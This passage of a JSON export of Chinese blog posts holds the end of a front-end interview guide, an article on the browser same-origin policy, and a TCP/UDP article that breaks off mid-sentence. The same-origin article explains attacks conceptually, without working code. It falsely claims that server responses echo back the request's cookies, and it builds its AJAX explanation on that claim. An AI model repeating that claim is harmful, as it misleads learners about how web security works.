、数据结构、数据库等\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e关于笔试的建议就是多刷题(超级学霸请无视我)，这里推荐几个网站：\u003cstrong\u003e牛客网，leetCode，赛码网\u003c/strong\u003e。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e注意：像牛客和赛码这里要注意一下，很多公司的笔试都是用的这两个平台，\u003cstrong\u003e建议多熟悉下这里的编程题的在线环境\u003c/strong\u003e。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e一面\u003c/h2\u003e\n\u003cp\u003e恭喜你，如果如果笔试过了那你就迈过了一个大坎，要知道很多同学都是连面试的资格都没有的。到了面试阶段，考察的大多是专业知识了，当然也不排除考计算机基础知识的。\u003c/p\u003e\n\u003cp\u003e一面这里考察的知识点比较基础，这里你的面试官会分析你的\u003cstrong\u003e技术基础能力扎不扎实\u003c/strong\u003e，你这个人的性格如何如何然后汇报个组里的老大决定你是否有机会参加下一轮的面试。\u003c/p\u003e\n\u003cp\u003e注意我提到的\u003cstrong\u003e性格\u003c/strong\u003e，大家都不愿意和一个怪异的人一起工作，一定要有热情乐观积极上进，这点真的很重要！\u003c/p\u003e\n\u003cp\u003e这里我的建议就是，基础我就不用说了一定要很扎实，面试官一下子就能看出你到底是会不会了，不要不懂装懂。但基本上一面要是被问住太多了的话那确实很不乐观了，但是也不排除一种情况，你的基础非常的扎实，面试官觉得这些基础知识点问了也是浪费时间于是开始深入问你，这个时候要注意，确实会闻到很多你不会的知识点，不要放弃尽可能的尝试，但也不要过于自大，\u003cstrong\u003e面试官希望看到的是你的潜能和面对未知问题的解决能力\u003c/strong\u003e。\u003c/p\u003e\n\u003ch2\u003e二面\u003c/h2\u003e\n\u003cp\u003e恭喜你通过了一面，你的基础还不错，接下来你将遇到的是组里的高T或者是业务方向的老大了(和大牛面对面)。\u003c/p\u003e\n\u003cp\u003e二面也会考察基础知识，这里基本都是匆匆过一遍了。注意了我可以很负责任的说，二面你会遇到很多的困难，二面会考察你的项目，面试官会根据你简历上的项目经历找一些他感兴趣的来问你，\u003cstrong\u003e简要的说并且说重点，从使用技术栈到项目架构的设计到技术难点的实现，分点说\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e面试官也是人，他也会好奇一些神奇的项目是怎么实现的，所以我的建议也就是平时多做一些有水平的项目，不要把todolist、图书馆管理系统这种烂大街的项目写在自己的简历上。\u003c/p\u003e\n\u003cp\u003e这里透露一下，你的二面面试官，很有可能是你未来的leader，它们问的问题很多都是平时遇到的技术难点啊，自己踩过的小坑啊啥的，有心的同学自己默默记住这些问题回去多看看，对自己的提升会有很大的帮助(毕竟你能网上搜到的问题都是些烂大街的问题，这时候大牛遇到过的问题和你探讨这种机会不用说都知道很难得吧)。\u003c/p\u003e\n\u003cp\u003e这里还要废话一下，不要遇到难题就放弃说不会，多尝试一下，还是那句话，\u003cstrong\u003e面试官想看到你对未知问题的解决能力\u003c/strong\u003e，我一般都是先说出我的想法把我的实现方法说一遍，这时候可能会遇到直接怼对了的情况那么只能说恭喜啦，但是大多数情况下你的解决办法都不是最优的，这时候面试官会一点点把你往正确的方向引导，\u003cstrong\u003e这一探索的过程才是面试官看出你这个人的软硬实力的关键\u003c/strong\u003e。\u003c/p\u003e\n\u003ch2\u003e三面\u003c/h2\u003e\n\u003cp\u003e恭喜你到最后一步了，这里是HR或者技术经理面啦，这里表现最真实的你就好，和hr或者老大聊聊天，说说自己的基本情况啥的，这里就不多说了。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e注意：其实还是要注意一点，很多同学都说我三面都过了为啥最后还是被拒了呢，这里其实不是你的第三面被拒了(当然你如果人品有问题啥的我就不多说了)，这里据我所知有这么几种情况：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e虽然真的面的很不错，但是公司的hc有限，只能说很遗憾；\u003c/li\u003e\n\u003cli\u003e还是hc有限这个点，但是这家公司是根据笔试+一面+二面+三面的综合评分决定的，只能说你很厉害但是有比你更厉害的人；\u003c/li\u003e\n\u003cli\u003e其实你的二面一面就不怎么样了只是说技术面试官不忍心拒绝你，往往hr更懂得拒绝别人；\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e这里就简单总结一下吧：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e自我介绍言简意赅，体现自己的个性和亮点，会什么着重说一下；\u003c/li\u003e\n\u003cli\u003e基础知识(计算机基础 + 专业技能基础)；\u003c/li\u003e\n\u003cli\u003e对待问题的解决能力；\u003c/li\u003e\n\u003cli\u003e不要表现自己的负面情绪，积极乐观；\u003c/li\u003e\n\u003cli\u003e沟通技巧；\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e注意：你的暑期实习经历对你的校招面试很有用，一定要争取找个暑期实习。我当时面暑期实习时候也是没有啥经验处处碰壁，后来实习了几个月后校招基本上是横扫，面一家过一家。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch1\u003e关于技术知识点\u003c/h1\u003e\n\u003cp\u003e这里就罗列一下我之前遇到的知识点，我的其他文章也写到过详情可以去看看(有些公司面试完可能忘了就没写)。博主上一次面试距今也有几个月了，忘的差不多了，这里就罗列一点我突然想到的哈，请谅解。\u003c/p\u003e\n\u003ch2\u003ehtml + css基础\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e基本的布局(中间自适应旁边固定啥的)的几种实现方法；\u003c/li\u003e\n\u003cli\u003e垂直居中的几种实现方法；\u003c/li\u003e\n\u003cli\u003e盒模型；\u003c/li\u003e\n\u003cli\u003eposition；\u003c/li\u003e\n\u003cli\u003e行内元素和块元素；\u003c/li\u003e\n\u003cli\u003eBFC(块级格式化上线文，和浮动一起考)；\u003c/li\u003e\n\u003cli\u003eanimation；\u003c/li\u003e\n\u003cli\u003e伪元素伪类；\u003c/li\u003e\n\u003cli\u003eless、sass、stylus这种预处理器；\u003c/li\u003e\n\u003cli\u003e......\u003ch2\u003ejs基础\u003c/h2\u003e\n\u003c/li\u003e\n\u003cli\u003e原型链；\u003c/li\u003e\n\u003cli\u003e闭包；\u003c/li\u003e\n\u003cli\u003e类和继承（es5实现方法 + es6实现方法）；\u003c/li\u003e\n\u003cli\u003elet、const、var；\u003c/li\u003e\n\u003cli\u003epromise；\u003c/li\u003e\n\u003cli\u003e异步处理方法；\u003c/li\u003e\n\u003cli\u003e写一个方法遍历所有文档树所有节点(考察递归)；\u003c/li\u003e\n\u003cli\u003ecookie和webstorege；\u003c/li\u003e\n\u003cli\u003ejsonp和跨域；\u003c/li\u003e\n\u003cli\u003esort排序相关(注意ascll这个坑)\u003c/li\u003e\n\u003cli\u003e数组和对象的深浅拷贝；\u003c/li\u003e\n\u003cli\u003eString + Array的一些基本操作；\u003c/li\u003e\n\u003cli\u003e写一个数组去重的方法；\u003c/li\u003e\n\u003cli\u003e冒泡和捕获；\u003c/li\u003e\n\u003cli\u003e事件代理；\u003c/li\u003e\n\u003cli\u003ethis相关(注意箭头函数的this指向问题)；\u003c/li\u003e\n\u003cli\u003ecall、apply、bind；\u003c/li\u003e\n\u003cli\u003e变量提升；\u003c/li\u003e\n\u003cli\u003e高阶函数；\u003c/li\u003e\n\u003cli\u003e动画；\u003c/li\u003e\n\u003cli\u003esetTimeout、setInterval和requestAnimationFrame；\u003c/li\u003e\n\u003cli\u003e模块化开发；\u003c/li\u003e\n\u003cli\u003e引起内存泄漏的原因；\u003c/li\u003e\n\u003cli\u003eajax；\u003c/li\u003e\n\u003cli\u003emap、filter、reduce相关；\u003c/li\u003e\n\u003cli\u003eMap和Set；\u003c/li\u003e\n\u003cli\u003e移动端开发相关；\u003c/li\u003e\n\u003cli\u003e......\u003ch2\u003e框架和工具相关\u003c/h2\u003e\n\u003c/li\u003e\n\u003cli\u003evue数据绑定原理；\u003c/li\u003e\n\u003cli\u003evue父子组件和兄弟组件的通信问题；\u003c/li\u003e\n\u003cli\u003evuex的原理；\u003c/li\u003e\n\u003cli\u003evuex的action和mutation的异步操作和同步操作问题；\u003c/li\u003e\n\u003cli\u003evue的事件监听；\u003c/li\u003e\n\u003cli\u003evue-router获取自定义参数；\u003c/li\u003e\n\u003cli\u003evue-router的go相关；\u003c/li\u003e\n\u003cli\u003evue组件设计相关；\u003c/li\u003e\n\u003cli\u003e模块化的工具；\u003c/li\u003e\n\u003cli\u003ewebpack打包优化；\u003c/li\u003e\n\u003cli\u003e设计一个自己的打包工具需要设计哪些主要功能；\u003c/li\u003e\n\u003cli\u003ebabel相关；\u003c/li\u003e\n\u003cli\u003emvvm的好处；\u003c/li\u003e\n\u003cli\u003ejquery的一些基本用法；\u003c/li\u003e\n\u003cli\u003elodash相关；\u003c/li\u003e\n\u003cli\u003evue和react的对比；\u003c/li\u003e\n\u003cli\u003evue和jquery的对比；\u003c/li\u003e\n\u003cli\u003e......\u003ch2\u003e技术拓展\u003c/h2\u003e\n\u003c/li\u003e\n\u003cli\u003e设计模式相关(单例、发布订阅等)；\u003c/li\u003e\n\u003cli\u003e浏览器渲染过程；\u003c/li\u003e\n\u003cli\u003e性能优化相关(这个点很大，设计很多方面，不要自以为优化就是网上经常看到的那一套)；\u003c/li\u003e\n\u003cli\u003e设计一个模版引擎；\u003c/li\u003e\n\u003cli\u003e设计一个打包工具；\u003c/li\u003e\n\u003cli\u003e设计一个mvvm框架需要注意的case；\u003c/li\u003e\n\u003cli\u003e源码阅读相关；\u003c/li\u003e\n\u003cli\u003e......\u003ch2\u003e项目相关\u003c/h2\u003e\n这里说几个我面试经常问到的项目。\u003c/li\u003e\n\u003cli\u003e仿饿了么购物车(本地购物车和全局购物车和本地存储，不是网上一艘就能搜到的哪些哦)；\u003c/li\u003e\n\u003cli\u003eChrome插件开发lettalk；\u003c/li\u003e\n\u003cli\u003ern开发的一个简单的社交app；\u003c/li\u003e\n\u003cli\u003e仿vue mvvm框架(阅读vue源码时候仿的)；\u003c/li\u003e\n\u003cli\u003e仿Jquery类库(阅读jquery源码时候仿的)；\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003e总结\u003c/h1\u003e\n\u003cp\u003e我能想到的也就这么多了，还是差很多东西的，请大家谅解。希望大家都能拿到自己满意的offer。\u003c/p\u003e\n","buildTime":"1514974190.9168","__v":0}
{"_id":{"$oid":"5a4cc287fa7d97296c4556d2"},"id":"5a24a879f265da431a430467","author":{"$oid":"5a4cc287fa7d97296c4556c6"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"再也不学AJAX了！（三）跨域获取资源 ① - 同源策略","meta":{"likeCount":0},"tag":["Ajax","浏览器","前端","安全"],"comment":[],"shortContent":"我们之前提到过，AJAX技术使开发者能够专注于互联网中数据的传输，而不再拘泥于数据传输的载体。通过AJAX技术，我们获取数据的方式变得更加灵活，可控和优雅。 但是AJAX技术并不是一把万能钥匙，互联网中的数据隐私和数据安全（例如你的银行账号和密码）也非常重要，为了保护某些用户数…","content":"\u003cp\u003e我们之前提到过，AJAX技术使开发者能够专注于互联网中\u003cstrong\u003e数据\u003c/strong\u003e的传输，而不再拘泥于数据传输的\u003cstrong\u003e载体\u003c/strong\u003e。通过AJAX技术，我们获取数据的方式变得更加灵活，可控和优雅。\u003c/p\u003e\n\u003cp\u003e但是AJAX技术并不是一把万能钥匙，互联网中的数据隐私和数据安全（例如你的银行账号和密码）也非常重要，为了保护某些用户数据的隐私与安全，浏览器使用“\u003cstrong\u003e同源策略\u003c/strong\u003e”限制了AJAX技术获取数据的范围和能力。但在一些合理的场景中，我们又不得不想办法绕过同源策略，实现跨域请求资源。因此“跨域技术”一直成为开发者们经久不衰的讨论话题。\u003c/p\u003e\n\u003cp\u003e在“跨域获取资源”这一主题中，我们将围绕“同源策略”和“跨域”两大主题展开，不但讲述它们是什么，更说明了为什么要这么做。相信你在读完该主题下的两篇文章后，一定会对这两大主题有一个清晰，系统的认识。\u003c/p\u003e\n\u003cp\u003e需要提前声明的是，本主题下的文章并不会像众多相同主题的文章一样罗列出所有的跨域技术，而只会捡最主流的四种进行讲解。因为我并不打算写“教你如何跨域”这样类型的文章。\u003c/p\u003e\n\u003cp\u003e让我们开始吧。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e同源策略\u003c/h2\u003e\n\u003cp\u003e整个互联网世界的数据要么存储在\u003cstrong\u003e服务端\u003c/strong\u003e（即服务器，如数据库，硬盘等）中，要么存储在\u003cstrong\u003e客户端\u003c/strong\u003e（即浏览器，如cookie，LocalStorage，sessionStorage）中。互联网数据的传输实际上就是客户端与服务端之间的交互。\u003c/p\u003e\n\u003cp\u003e而所谓的数据隐私与安全保护，说白了就是数据拥有者对数据索取者发出警告：“\u003cstrong\u003e不是你的你别动\u003c/strong\u003e”。\u003c/p\u003e\n\u003cp\u003e搞清了这个原则，我们就很容易明白，如果你在客户端，并且想要获取服务端数据，你首先需要通过服务器端的验证，证明你有权限获取数据（例如“登录”），而如果你在服务端，想要获取客户端的某些数据，你同样需要客户端通过某些方式验证你有资格获取相应的数据资源。\u003c/p\u003e\n\u003cp\u003e那么上面提到的“\u003cstrong\u003e某些方式\u003c/strong\u003e”是什么呢？其中最重要的就是我们今天的主题之一    -- 浏览器的“同源策略”。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e浏览器的“同源策略”\u003c/h3\u003e\n\u003cp\u003e浏览器所遵守的“同源策略”是指：\u003cstrong\u003e限制不同源之间执行特定操作\u003c/strong\u003e。这涉及到两个问题：什么是“\u003cstrong\u003e源\u003c/strong\u003e”？，以及“\u003cstrong\u003e特定操作\u003c/strong\u003e”是指什么？\u003c/p\u003e\n\u003cp\u003e让我们停下来解释一下这个概念：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e一个\u003cstrong\u003e源\u003c/strong\u003e由\u003cstrong\u003e协议\u003c/strong\u003e，\u003cstrong\u003e域名\u003c/strong\u003e和\u003cstrong\u003e端口\u003c/strong\u003e三部分组成，这三者任一一个不同都会被浏览器识别为不同的源；\u003c/li\u003e\n\u003cli\u003e上文所提到的\u003cstrong\u003e特定操作\u003c/strong\u003e是指：\n\u003cul\u003e\n\u003cli\u003e读取 Cookie，LocalStorage 和 IndexDB；\u003c/li\u003e\n\u003cli\u003e获取 DOM 元素；\u003c/li\u003e\n\u003cli\u003e发送 AJAX 请求；\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e在搞清了同源策略的概念之后，让我们看看浏览器是出于怎样的考虑，一直坚守着同源策略：\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e为什么要有“源”的概念？\u003c/h3\u003e\n\u003cp\u003e因为不同的源，大多数情况下就意味着它们在互联网中归属于不同的站点（或是被用作不同的用途）。也就是说它们是不同的项目，有不同的文件根目录，那么它们的数据也不应该共享也就理所应当了，否则数据的隐私和安全也无从谈起。不过请注意，我上面所说的话是基于“不同源就彼此不相干”的假设，这其实存在一些问题，我们之后会提到。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e为什么不能执行“特定操作”？\u003c/h3\u003e\n\u003cp\u003e这个需要我们假设，如果我们想做一些“坏事”，并且浏览器允许我们执行这些“特定操作”，我们作为“坏人”能做什么：\u003c/p\u003e\n\u003cp\u003e首先，由于很多网站使用浏览器存储用户的用户名和密码，那么我们便可以在A域中（我们在服务器上托管的网站）读取任意来访用户的所有Cookie信息（没有同源策略的保护，该用户所有网站的Cookie记录都是透明的），我们就可以利用这些Cookie信息伪装成来访用户做任何事，而在现实世界，出于同源政策的保护，我们只能访问用户该域下的Cookie信息，也就是说，我们只能访问我们自己设置的Cookie信息。\u003c/p\u003e\n\u003cp\u003e其次，如果我们能够获取不同域下的DOM元素，我们就可以通过\u003ccode\u003e\u0026lt;iframe\u0026gt;\u003c/code\u003e标签在我们的A域网站上引入B域网站，然后诱使用户在B域网站操作，由于我们能够跨域获取DOM元素，因此我们可以操作B域网站的DOM结构，用户输入的一切信息，以及用户操作的DOM元素就都在我们的掌控之中了。这正是同源策略想要规避的安全隐患。\u003c/p\u003e\n\u003cp\u003e最后，为什么要禁止不同源的站点发送AJAX请求呢？这个说起来有些复杂，我们首先要对Cookie的运作原理有一个大致的了解：\u003c/p\u003e\n\u003cp\u003e当我们设置Cookie时，除了存放键值对形式的数据信息外，浏览器还会为Cookie的一些属性填充默认值（我们也可以手动修改这些属性的值）。在这些属性中，我们需要关注\u003ccode\u003edomain\u003c/code\u003e和\u003ccode\u003epath\u003c/code\u003e两个属性，它们一个代表域名，一个代表路径，两者加起来构成了一个确定这条Cookie何时被调用和访问的URL。与此同时，浏览器自己维护的Cookie文件中也会添加这一条新创建的Cookie数据。\u003c/p\u003e\n\u003cp\u003e当我们在浏览器中发送HTTP请求时，浏览器首先会检查请求地址并在自己所维护的Cookie文件中寻找匹配的Cookie信息，将其添加到请求头中的\u003ccode\u003eCookie\u003c/code\u003e属性内，然后向服务器发送请求。请注意，这个自动添加相应Cookie信息的过程是浏览器自己偷偷帮我们做到的，也就是说，我们自己无法控制这个过程。\u003c/p\u003e\n\u003cp\u003e下面重点来了，当我们的HTTP请求到达服务器时，服务器返回的响应中，响应头会原封不动的返回我们发送给他的Cookie信息。嗅到危险的味道了吗？我们虽然不能在发送请求前获得Cookie信息，但是在发送请求后，我们还是能够获得用户的Cookie！\u003c/p\u003e\n\u003cp\u003e让我再进一步解释一下这和AJAX有什么关系，假设我们在自己的服务器上托管了站点A，并在其中隐藏了一段脚本，每个登录站点A的人都会自动发送AJAX请求至站点B（提示：站点B是一个银行），那么在没有浏览器同源策略的情况下，如果站点A中的访问者恰好有Cookie中保留站点B信息的用户，通过AJAX请求返回的响应头，我们一样可以拿到这位用户的站点B Cookie，从而伪装成用户在站点B登录，做一些违法乱纪的事情（\u003ca target=\"_blank\" href=\"https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0\"\u003eCSRF\u003c/a\u003e攻击即是利用了这个原理，只不过出于同源策略限制，并不能通过发起AJAX的方式）。\u003c/p\u003e\n\u003cp\u003e虽然有些费劲，但是现在你应该明白为什么同源策略要阻止跨域发送AJAX了吧？（我终于将这个概念说清楚了，真是费了不少力气 👻）\u003c/p\u003e\n\u003cp\u003e想要了解更多关于Cookie的信息，可以参考这篇\u003ca target=\"_blank\" href=\"https://segmentfault.com/a/1190000004556040\"\u003e文章\u003c/a\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e同源策略的表现\u003c/h3\u003e\n\u003cp\u003e看看我们的任务清单，我们解释了\u003cstrong\u003e什么是同源策略\u003c/strong\u003e以及\u003cstrong\u003e浏览器为什么要有同源策略\u003c/strong\u003e，但至今为止，我们还不曾看到，在浏览器同源策略的限制下，当我们想要获取跨域Cookie，DOM结构和发送AJAX时，我们是如何被“拒绝”的。\u003c/p\u003e\n\u003cp\u003e首先，我们在一个域下只能读取该域下的Cookie值。当我们在页面中使用\u003ccode\u003e\u0026lt;iframe\u0026gt;\u003c/code\u003e标签时，我们获取对应DOM节点下只有一个空空的\u003ccode\u003e#document\u003c/code\u003e节点，并没有额外的DOM信息。\u003c/p\u003e\n\u003cimg style=\"display: block; width: 100%\" src=\"https://user-gold-cdn.xitu.io/2017/12/4/1601f323ec311701?w=1678\u0026amp;h=134\u0026amp;f=png\u0026amp;s=43132\"\u003e\n\u003cp\u003e而对于AJAX，浏览器\u0008其实并没有阻止我们向不同域发送请求，其阻止的是\u0008这次请求的响应，也就是说服务端其实接收到了这次请求，只是响应被浏览器解析时被浏览器发现违背了同源策略而被拒绝，此时，浏览器会在控制台中打印出一条错误信息。\u003c/p\u003e\n\u003cimg style=\"display: block; width: 100%\" src=\"https://user-gold-cdn.xitu.io/2017/12/4/1601f323e28b9cd7?w=1746\u0026amp;h=99\u0026amp;f=png\u0026amp;s=56481\"\u003e\n\u003cp\u003e另外需要注意的是，对于XHR请求，实际上我们在请求报头也不会看到相应的Cookie信息，这是因为CORS\u0008标准中做了规定，默认情况下，浏览器在发送跨域请求时，不能发送任何认证信息，比如\u003ccode\u003ecookies\u003c/code\u003e和\u003ccode\u003eHTTP authentication schemes\u003c/code\u003e。除非你显式的将\u003ccode\u003exhr\u003c/code\u003e实例的\u003ccode\u003ewithCredentials\u003c/code\u003e\u0008属性的值设置为\u003ccode\u003etrue\u003c/code\u003e并且服务器端也允许客户端请求携带认证信息（即服务器端在响应头中设置了\u003ccode\u003eAccess-Control-Allow-Credentials: true\u003c/code\u003e）。\u003c/p\u003e\n\u003cp\u003e要在跨域请求头中显示Cookie真是不容易对吧？\u003c/p\u003e\n\u003cp\u003e但是，等等！CORS标准是什么？\u003c/p\u003e\n\u003cp\u003e问得好，在下一篇以“跨域发送请求”\u0008为主题的文章中，我们会详细谈到他。目前为止，你已经充分了解“同源策略”这个主题。Good Job！\u003c/p\u003e\n\u003cp\u003e现在让我们先暂时休息一下，\u0008下一篇见 🙌。\u003c/p\u003e\n\u003cbr\u003e\n\u003cbr\u003e\n\u003cbr\u003e\n👋  Hey！喜欢这篇文章吗？别忘了在下方👇 点赞让我知道。","buildTime":"1514968795.7927","__v":0}
{"_id":{"$oid":"5a4cc287fa7d97296c4556d3"},"id":"5a2ff1f36fb9a04500030771","author":{"$oid":"5a4cc287fa7d97296c4556b8"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"[面试∙网络] TCP/IP（四）：TCP 与 UDP 协议简介","meta":{"likeCount":0},"tag":["面试","前端","TCP/IP","服务器"],"comment":[],"shortContent":"从本章开始，我们开始介绍最重要的传输层。传输层位于 OSI 七层模型的第四层（由下往上）。顾名思义，传输层的主要作用是实现应用程序之间的通信。网络层主要是保证不同数据链路下数据的可达性，至于如何传输数据则是由传输层负责。 常见的传输层协议主要有 TCP 协议和 UDP 协议。T…","content":"\u003cp\u003e从本章开始，我们开始介绍最重要的传输层。传输层位于 OSI 七层模型的第四层（由下往上）。顾名思义，传输层的主要作用是\u003cstrong\u003e实现应用程序之间的通信\u003c/strong\u003e。网络层主要是保证不同数据链路下数据的可达性，至于如何传输数据则是由传输层负责。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e传输层协议简介\u003c/h1\u003e\n\u003cp\u003e常见的传输层协议主要有 TCP 协议和 UDP 协议。TCP 协议是面向有连接的协议，也就是说在使用 TCP 协议传输数据之前一定要在发送方和接收方之间建立连接。一般情况下建立连接需要三步，关闭连接需要四步。\u003c/p\u003e\n\u003cp\u003e建立 TCP 连接后，由于有数据重传、流量控制等功能，TCP 协议能够正确处理丢包问题，保证接收方能够收到数据，与此同时还能够有效利用网络带宽。然而 TCP 协议中定义了很多复杂的规范，因此效率不如 UDP 协议，不适合实时的视频和音频传输。\u003c/p\u003e\n\u003cp\u003eUDP 协议是面向无连接的协议，它只会把数据传递给接收端，但是不会关注接收端是否真的收到了数据。但是这种特性反而适合多播，实时的视频和音频传输。因为个别数据包的丢失并不会影响视频和音频的整体效果。\u003c/p\u003e\n\u003cp\u003eIP 协议中的两大关键要素是源 IP 地址和目标 IP 地址。而刚刚我们说过，传输层的主要作用是\u003cstrong\u003e实现应用程序之间的通信\u003c/strong\u003e。因此传输层的协议中新增了三个要素：源端口号，目标端口号和协议号。通过这五个信息，可以唯一识别一个通信。\u003c/p\u003e\n\u003cp\u003e不同的端口用于区分同一台主机上不同的应用程序。假设你打开了两个浏览器，浏览器 A 发出的请求不会被浏览器 B 接收，这就是因为 A 和 B 具有不同的端口。\u003c/p\u003e\n\u003cp\u003e协议号用于区分使用的是 TCP 还是 UDP。因此相同两台主机上，相同的两个进程之间的通信，在分别使用 TCP 协议和 UDP 协议时也可以被正确的区分开来。\u003c/p\u003e\n\u003cp\u003e用一句话来概括就是：“源 IP 地址，目标 IP 地址，源端口号，目标端口号和协议号”这五个信息只要有一个不同，都被认为是不同的通信。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003eUDP 首部\u003c/h1\u003e\n\u003cp\u003eUDP 协议最大的特点就是简单，它的首部如下图所示：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"UDP 首部\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/1604b4917a0c314f?w=1240\u0026amp;h=494\u0026amp;f=png\u0026amp;s=289029\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e包长度表示 UDP 首部的长度和 UDP 数据长度之和。\u003c/p\u003e\n\u003cp\u003e校验和用来判断数据在传输过程中是否损坏。计算这个校验和的时候，不仅考虑源端口号和目标端口号，还要考虑 IP 首部中的源 IP 地址，目标 IP 地址和协议号（这些又称为 UDP 伪首部）。这是因为以上五个要素用于识别通信时缺一不可，如果校验和只考虑端口号，那么另外三个要素收到破坏时，应用就无法得知。这有可能导致不该收到包的应用收到了包，该收到包的应用反而没有收到。\u003c/p\u003e\n\u003cp\u003e这个概念同样适用于即将介绍的 TCP 首部。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003eTCP 首部\u003c/h1\u003e\n\u003cp\u003e和 UDP 首部相比，TCP 首部要复杂得多。解析这个首部的时间也相应的会增加，这是导致 TCP 连接的效率低于 UDP 的原因之一。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"TCP 首部\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/1604b4917702553b?w=1240\u0026amp;h=898\u0026amp;f=png\u0026amp;s=359939\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e其中某些关键字段解释如下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e序列号：它表示发送数据的位置，假设当前的序列号为 s，发送数据长度为 l，则下次发送数据时的序列号为 s + l。在建立连接时通常由计算机生成一个随机数作为序列号的初始值。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e确认应答号：它等于下一次应该接收到的数据的序列号。假设发送端的序列号为 s，发送数据的长度为 l，那么接收端返回的确认应答号也是 s + l。发送端接收到这个确认应答后，可以认为这个位置以前所有的数据都已被正常接收。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e数据偏移：TCP 首部的长度，单位为 4 字节。如果没有可选字段，那么这里的值就是 5。表示 TCP 首部的长度为 20 字节。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e控制位：改字段长度为 8 比特，分别有 8 个控制标志。依次是 CWR，ECE，URG，ACK，PSH，RST，SYN 和 FIN。在后续的文章中你会陆续接触到其中的某些控制位。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e窗口大小：用于表示从应答号开始能够接受多少个 8 位字节。如果窗口大小为 0，可以发送窗口探测。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e紧急指针：尽在 URG 控制位为 1 时有效。表示紧急数据的末尾在 TCP 数据部分中的位置。通常在暂时中断通信时使用（比如输入 Ctrl + C）。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1 class=\"heading\"\u003eTCP 握手\u003c/h1\u003e\n\u003cp\u003eTCP 是面向有连接的协议，连接在每次通信前被建立，通信结束后被关闭。了解连接建立和关闭的过程通常是考察的重点。连接的建立和关闭过程可以用一张图来表示：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"TCP 连接建立和关闭\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/1604b4917725c794?w=683\u0026amp;h=506\u0026amp;f=png\u0026amp;s=37375\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e通常情况下，我们认为客户端首先发起连接。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e三次握手建立连接\u003c/h3\u003e\n\u003cp\u003e这个过程可以用以下三句形象的对话表示：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e（客户端）：我要建立连接了。\u003c/li\u003e\n\u003cli\u003e（服务端）：我知道你要建立连接了，我这边没有问题。\u003c/li\u003e\n\u003cli\u003e（客户端）：我知道你知道我要建立连接了，接下来我们就正式开始通信。\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003e为什么是三次握手\u003c/h3\u003e\n\u003cp\u003e根据一般的思路，我们可能会觉得只要两次握手就可以了，第三步确认看似是多余的。那么 TCP 协议为什么还要费力不讨好的加上这一次握手呢？\u003c/p\u003e\n\u003cp\u003e这是因为在网络请求中，我们应该时刻记住：“网络是不可靠的，数据包是可能丢失的”。假设没有第三次确认，客户端向服务端发送了 SYN，请求建立连接。由于延迟，服务端没有及时收到这个包。于是客户端重新发送一个 SYN 包。回忆一下介绍 TCP 首部时提到的序列号，这两个包的序列号显然是相同的。\u003c/p\u003e\n\u003cp\u003e假设服务端接收到了第二个 SYN 包，建立了通信，一段时间后通信结束，连接被关闭。这时候最初被发送的 SYN 包刚刚抵达服务端，服务端又会发送一次 ACK 确认。由于两次握手就建立了连接，此时的服务端就会建立一个新的连接，然而客户端觉得自己并没有请求建立连接，所以就不会向服务端发送数据。从而导致服务端建立了一个空的连接，白白浪费资源。\u003c/p\u003e\n\u003cp\u003e在三次握手的情况下，服务端直到收到客户端的应答后才会建立连接。因此在上述情况下，客户端会接受到一个相同的 ACK 